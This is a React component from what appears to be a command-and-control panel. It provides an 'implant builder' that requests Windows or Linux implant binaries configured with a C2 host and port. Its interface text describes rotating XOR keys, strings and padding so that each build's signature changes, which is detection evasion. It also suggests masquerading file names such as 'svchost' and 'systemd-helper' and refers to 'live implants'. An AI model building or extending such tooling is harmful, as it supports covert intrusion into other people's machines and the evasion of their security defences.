import React, { useCallback, useEffect, useState } from 'react';
import styled from 'styled-components';
import axios from 'axios';
import { toast } from 'react-toastify';
import { FaWindows, FaLinux } from 'react-icons/fa';
import { FiDownload, FiRefreshCw, FiCpu } from 'react-icons/fi';

const Section = styled.section`
  animation: fadeIn 0.35s ease-out;
  min-height: calc(100vh - 120px);

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;

const Head = styled.div`
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 16px;
  flex-wrap: wrap;
  margin-bottom: 16px;

  h2 {
    margin: 0;
    font-family: 'Syne', system-ui, sans-serif;
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -0.03em;
    color: #eef1f6;
  }

  p {
    margin: 6px 0 0;
    color: #8b93a7;
    font-size: 13px;
    max-width: 560px;
  }
`;

const Grid = styled.div`
  display: grid;
  grid-template-columns: 1.1fr 1fr;
  gap: 28px;

  @media (max-width: 980px) {
    grid-template-columns: 1fr;
  }
`;

const Field = styled.label`
  display: flex;
  flex-direction: column;
  gap: 6px;
  margin-bottom: 12px;
  font-size: 12px;
  color: #8b93a7;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  font-weight: 600;
`;

const Input = styled.input`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 10px 12px;
  font-size: 14px;
  font-family: inherit;
  text-transform: none;
  letter-spacing: normal;
  font-weight: 500;
  outline: none;

  &:focus {
    border-color: #c6f23e;
  }
`;

const Select = styled.select`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 10px 12px;
  font-size: 14px;
  font-family: inherit;
  text-transform: none;
  letter-spacing: normal;
  font-weight: 500;
  outline: none;

  &:focus {
    border-color: #c6f23e;
  }

  option {
    background: #161a22;
  }
`;

const PlatformRow = styled.div`
  display: flex;
  gap: 8px;
  margin-bottom: 14px;
`;

const PlatformBtn = styled.button`
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 12px;
  border-radius: 10px;
  border: 1px solid ${props => props.$active ? 'rgba(198, 242, 62, 0.35)' : '#2a3140'};
  background: ${props => props.$active ? 'rgba(198, 242, 62, 0.12)' : '#161a22'};
  color: ${props => props.$active ? '#c6f23e' : '#aeb6c7'};
  font-family: inherit;
  font-weight: 600;
  font-size: 13px;
  cursor: pointer;
  transition: border-color 0.15s, color 0.15s, background 0.15s;

  &:hover {
    border-color: rgba(198, 242, 62, 0.35);
    color: #c6f23e;
  }
`;

const GenerateBtn = styled.button`
  width: 100%;
  margin-top: 4px;
  padding: 12px 16px;
  border: none;
  border-radius: 10px;
  background: #c6f23e;
  color: #0e1014;
  font-family: inherit;
  font-weight: 700;
  font-size: 14px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: background 0.15s;

  &:hover:not(:disabled) {
    background: #d4ff5a;
  }

  &:disabled {
    opacity: 0.55;
    cursor: not-allowed;
  }
`;

const Note = styled.div`
  margin-top: 12px;
  font-size: 12px;
  color: #8b93a7;
  line-height: 1.5;
`;

const BuildsHead = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 10px;

  h3 {
    margin: 0;
    font-size: 13px;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #5c657a;
    font-weight: 600;
  }
`;

const IconBtn = styled.button`
  background: transparent;
  border: 1px solid #2a3140;
  color: #aeb6c7;
  width: 32px;
  height: 32px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;

  &:hover {
    border-color: #c6f23e;
    color: #c6f23e;
  }
`;

const BuildList = styled.div`
  max-height: 280px;
  overflow-y: auto;
  display: flex;
  flex-direction: column;
  gap: 6px;
`;

const BuildRow = styled.div`
  display: grid;
  grid-template-columns: 28px 1fr auto;
  gap: 10px;
  align-items: center;
  padding: 10px 8px;
  border-bottom: 1px solid #1e2430;
`;

const BuildMeta = styled.div`
  min-width: 0;

  .name {
    font-size: 13px;
    font-weight: 600;
    color: #eef1f6;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .sub {
    font-size: 11px;
    color: #8b93a7;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
`;

const authHeaders = () => ({
  Authorization: `Bearer ${localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || ''}`,
});

function formatBytes(n) {
  if (!n && n !== 0) return '';
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(2)} MB`;
}

const ImplantBuilder = () => {
  const [platform, setPlatform] = useState('windows');
  const [arch, setArch] = useState('amd64');
  const [host, setHost] = useState('127.0.0.1');
  const [port, setPort] = useState(2026);
  const [outputName, setOutputName] = useState('');
  const [busy, setBusy] = useState(false);
  const [builds, setBuilds] = useState([]);

  const loadDefaults = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/defaults', { headers: authHeaders() });
      if (res.data?.host) setHost(res.data.host);
      if (res.data?.port) setPort(res.data.port);
    } catch (e) {
      /* keep defaults */
    }
  }, []);

  const loadBuilds = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/builds', { headers: authHeaders() });
      setBuilds(res.data?.builds || []);
    } catch (e) {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    loadDefaults();
    loadBuilds();
  }, [loadDefaults, loadBuilds]);

  const handleGenerate = async () => {
    if (!host.trim()) {
      toast.error('C2 host is required');
      return;
    }
    setBusy(true);
    try {
      const res = await axios.post(
        '/api/builder/generate',
        {
          platform,
          arch,
          host: host.trim(),
          port: Number(port),
          outputName: outputName.trim() || undefined,
        },
        { headers: authHeaders(), timeout: 300000 }
      );
      const b = res.data?.build;
      toast.success(
        `${platform} build ready — signature ${b?.sha256?.slice(0, 10) || ''}…`
      );
      await loadBuilds();
    } catch (e) {
      toast.error(e.response?.data?.error || e.message || 'Build failed');
    } finally {
      setBusy(false);
    }
  };

  const handleDownload = async (id, fileName) => {
    try {
      const res = await axios.get(`/api/builder/download/${id}`, {
        headers: authHeaders(),
        responseType: 'blob',
      });
      const url = window.URL.createObjectURL(new Blob([res.data]));
      const a = document.createElement('a');
      a.href = url;
      a.download = fileName || 'implant';
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.URL.revokeObjectURL(url);
    } catch (e) {
      toast.error('Download failed');
    }
  };

  return (
    <Section>
      <Head>
        <div>
          <h2>Generate implant</h2>
          <p>
            Build a fresh Windows or Linux binary from <code>lastfinalversion2.go</code>.
            Every generation rotates XOR keys, shift, strings, and padding so the signature changes.
          </p>
        </div>
      </Head>

      <Grid>
        <div>
          <PlatformRow>
            <PlatformBtn
              type="button"
              $active={platform === 'windows'}
              onClick={() => setPlatform('windows')}
            >
              <FaWindows /> Windows
            </PlatformBtn>
            <PlatformBtn
              type="button"
              $active={platform === 'linux'}
              onClick={() => setPlatform('linux')}
            >
              <FaLinux /> Linux
            </PlatformBtn>
          </PlatformRow>

          <Field>
            Architecture
            <Select value={arch} onChange={(e) => setArch(e.target.value)}>
              <option value="amd64">amd64 (x64)</option>
              <option value="386">386 (x86)</option>
              <option value="arm64">arm64</option>
            </Select>
          </Field>

          <Field>
            C2 Host
            <Input
              value={host}
              onChange={(e) => setHost(e.target.value)}
              placeholder="127.0.0.1 or your domain"
            />
          </Field>

          <Field>
            C2 Port
            <Input
              type="number"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              min={1}
              max={65535}
            />
          </Field>

          <Field>
            Output name (optional)
            <Input
              value={outputName}
              onChange={(e) => setOutputName(e.target.value)}
              placeholder={platform === 'windows' ? 'svchost' : 'systemd-helper'}
            />
          </Field>

          <GenerateBtn type="button" onClick={handleGenerate} disabled={busy}>
            <FiCpu />
            {busy
              ? 'Building (unique signature)…'
              : `Generate ${platform === 'windows' ? 'Windows EXE' : 'Linux binary'}`}
          </GenerateBtn>

          <Note>
            Each build rewrites obfuscation keys and embeds a unique stamp. Use local host/port for testing,
            production host/TCP for live implants.
          </Note>
        </div>

        <div>
          <BuildsHead>
            <h3>Recent builds</h3>
            <IconBtn type="button" onClick={loadBuilds} title="Refresh">
              <FiRefreshCw size={14} />
            </IconBtn>
          </BuildsHead>

          <BuildList>
            {builds.length === 0 ? (
              <div style={{ color: '#5c657a', fontSize: 13, padding: '12px 0' }}>
                No builds yet. Generate one to see it here.
              </div>
            ) : (
              builds.map((b) => (
                <BuildRow key={b.id}>
                  <div style={{ color: '#c6f23e' }}>
                    {b.platform === 'linux' ? <FaLinux /> : <FaWindows />}
                  </div>
                  <BuildMeta>
                    <div className="name">{b.fileName}</div>
                    <div className="sub">
                      {b.platform}/{b.arch} · {b.host}:{b.port} · {formatBytes(b.size)} ·{' '}
                      {new Date(b.createdAt).toLocaleString()} · {b.sha256?.slice(0, 8)}
                    </div>
                  </BuildMeta>
                  <IconBtn
                    type="button"
                    title="Download"
                    onClick={() => handleDownload(b.id, b.fileName)}
                  >
                    <FiDownload size={14} />
                  </IconBtn>
                </BuildRow>
              ))
            )}
          </BuildList>
        </div>
      </Grid>
    </Section>
  );
};

export default ImplantBuilder;
